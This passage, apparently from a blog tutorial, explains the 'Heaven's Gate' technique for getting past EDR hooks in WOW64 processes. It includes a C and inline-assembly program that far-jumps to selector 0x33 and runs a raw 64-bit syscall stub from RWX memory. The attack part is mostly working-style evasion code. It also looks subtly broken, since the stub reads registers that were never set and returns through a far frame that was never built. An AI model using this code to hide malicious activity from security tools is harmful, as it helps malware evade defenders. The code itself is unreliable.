<text font-family="monospace" font-size="12" font-weight="600" fill="white" x="340" y="478" text-anchor="middle">kernel (Ring 0)</text>

</svg>
Look at the WOW64 chain above. Every single layer in that chain is a place an EDR can plant a hook:

- `SysWOW64\ntdll.dll` is hooked
- `wow64.dll` is hooked
- `wow64cpu.dll` is hooked
- `System32\ntdll.dll` is hooked

That's four separate interception points before the syscall even reaches the kernel. Even if we bypass one layer, the EDR sitting at the next layer catches us. Our indirect syscall trick from earlier only addressed the 64-bit ntdll hook, in a WOW64 process we still have three more layers above it watching every call.

**Heaven's Gate skips all of them**. But we must first know that on WoW64, two code segment selectors exist:

- `0x23` = 32-bit mode (where your process normally runs)
- `0x33` = 64-bit mode (where the 64-bit ntdll runs)

 A far jump (retf) lets you change the CS register. If you push `0x33` as the new CS and jump, the CPU switches to 64-bit  mode right then.  

The trickl is that `wow64cpu.dll` does something interesting to switch CPU from 32-bit to 64-bit mode. It executes a **far jump** to the code segment selector `0x33`. On any WoW64 system, segment `0x33` is the 64-bit code segment. When the CPU sees a far jump targeting `0x33`, it flips into 64-bit mode and starts executing whatever is at the target address as 64-bit instructions. 

Heaven's Gate is simply doing that jump yourself, from our own code, before any of the WoW64 layers get a chance to run. We write a small 64-bit shellcode stub into executable memory, construct a far pointer to it with selector `0x33`, and jump to it. The CPU switches modes mid-execution, your stub runs as 64-bit code, issues the syscall directly, and returns. The entire WoW64 translation chain, and every hook planted on it, is bypassed completely. 

On the mitigation side, Windows 10 and later tightened WoW64 transitions significantly. Control Flow Guard makes arbitrary far jumps harder to pull off cleanly, and Microsoft has added instrumentation to the WoW64 layer itself that makes the raw `0x33` transition more visible to kernel-level monitoring. On a fully patched modern system it is considerably harder to execute cleanly than it was in 2009.

```c
// Heaven's Gate test 32-bit process jumps to 64-bit mode via far jmp to CS 0x33
// WoW64 normally routes 32-bit syscalls through 4 hook layers before reaching the kernel.
// A far jmp to CS 0x33 switches the CPU to 64-bit mode mid-execution, letting us issue
// a 64-bit syscall directly and skip all WoW64 layers.
//
// Build (must be 32-bit):
//   i686-w64-mingw32-gcc heaven_gate_test.c -o heaven_gate_test.exe

#include <windows.h>
#include <stdio.h>

// NtAllocateVirtualMemory SSN, verify on your build via x64dbg if it fails
#define SSN_ALLOC 0x18

void main()
{
    PVOID  base   = NULL;
    SIZE_T size   = 0x1000;
    HANDLE proc   = (HANDLE)(ULONG_PTR)-1;
    DWORD  status = 0;

    // 64-bit shellcode stub:
    //   mov r10, rcx
    //   mov eax, SSN
    //   syscall
    //   ret
    //   far jmp back to CS 0x23 (32-bit)
    // We embed raw 64-bit bytes and call them via far jmp to CS 0x33
    unsigned char stub[] = {
        // entered in 64-bit mode via far jmp from 32-bit code below 
        0x4C, 0x8B, 0xD1,                               // mov r10, rcx
        0xB8, SSN_ALLOC, 0x00, 0x00, 0x00,              // mov eax, SSN
        0x0F, 0x05,                                     // syscall
        // far jmp back: retfq pops rip then cs, we push 0x23 then ret addr
        0x48, 0xCB                                      // retfq (far return to 32-bit)
    };

    PVOID exec = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) { printf("[-] VirtualAlloc failed\n"); return; }
    memcpy(exec, stub, sizeof(stub));

    printf("[*] Heaven's Gate test\n");
    printf("[*] 64-bit stub @ %p\n", exec);
    printf("[*] SSN = 0x%02X, switching to CS 0x33\n\n", SSN_ALLOC);

    // Far call into 64-bit stub via CS 0x33
    // We build a far pointer {offset, selector} on the stack and lcall it
    // Args to NtAllocateVirtualMemory pushed right-to-left on stack before the switch
    __asm__ volatile (
        // push NtAllocateVirtualMemory args right-to-left (32-bit stack)
        "push %[protect]    \n"  // Protect = PAGE_READWRITE
        "push %[alloc_type] \n"  // AllocationType = MEM_COMMIT|MEM_RESERVE
        "push %[sz_ptr]     \n"  // RegionSize ptr
        "push $0            \n"  // ZeroBits
        "push %[base_ptr]   \n"  // BaseAddress ptr
        "push %[proc]       \n"  // ProcessHandle

        // build far pointer: [eip, cs] on stack then retf
        "push $0x33         \n"  // CS selector for 64-bit mode
        "push %[fn]         \n"  // EIP = stub address
        "retf               \n"  // switch to 64-bit, execute stub

        // stub does retfq back here with status in eax
        "mov  %%eax, %[res] \n"
        "add  $24, %%esp    \n"  // clean up the 6 args we pushed
        : [res] "=m" (status)
        : [fn]       "r" ((DWORD)(ULONG_PTR)exec),
          [proc]     "r" ((DWORD)(ULONG_PTR)proc),
          [base_ptr] "r" ((DWORD)(ULONG_PTR)&base),
          [sz_ptr]   "r" ((DWORD)(ULONG_PTR)&size),
          [alloc_type] "i" (MEM_COMMIT | MEM_RESERVE),
          [protect]    "i" (PAGE_READWRITE)
        : "eax", "memory"
    );

    if (status == 0)
        printf("[+] NtAllocateVirtualMemory OK: base=%p size=0x%zX\n", base, size);
    else
        printf("[-] NtAllocateVirtualMemory failed: NTSTATUS=0x%08X\n", status);

    VirtualFree(exec, 0, MEM_RELEASE);
}
```
# Closing Thoughts

Everything covered so far has been technique or algorithm for resolving SSNs or executing syscalls. [SysWhispers](https://github.com/klezVirus/SysWhispers3) is a different cuz it's a tool  that automates the implementation of those techniques. We describe which syscalls we need, run the tools and it generates ready to compile header and assembly files. It has gone through 3 major versions, and each one reflects how EDR detection caught up with previous. There are also other different techniques which I might myself study and cover up in next blogs like [RecycledGate](https://github.com/thefLink/RecycledGate). If there is any other techniques or something interesting topic do comment them below.

`(ㅠ﹏ㅠ) `

---
